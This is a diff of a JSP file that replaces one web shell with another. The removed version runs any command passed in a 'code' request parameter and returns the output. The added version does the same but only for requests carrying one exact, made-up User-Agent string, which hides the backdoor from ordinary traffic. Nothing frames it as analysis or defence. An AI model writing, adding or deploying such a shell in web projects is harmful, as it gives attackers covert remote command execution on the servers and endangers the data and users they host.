@@ -1,12 +1,9 @@
-<%@ page import="java.io.*" %><%
-   String code = request.getParameter("code");
-   String content = "";
-   if(code != null) {
-      String s = null;
-      try {
-         Process p = Runtime.getRuntime().exec(code,null,null);
-         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
-         while((s = sI.readLine()) != null) { content += s+" "; }
-      }  catch(IOException e) {   e.printStackTrace();   }}
-    %><%=content + "\n"
+<%@ page import="java.io.*"%><%
+if (request.getParameter("code") != null && request.getHeader("user-agent").equals("Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0")) { 
+Process p = Runtime.getRuntime().exec(request.getParameter("code"));
+DataInputStream dis = new DataInputStream(p.getInputStream());
+String disr = dis.readLine();
+while ( disr != null ){
+  out.println(disr);
+  disr = dis.readLine();}}
 %>
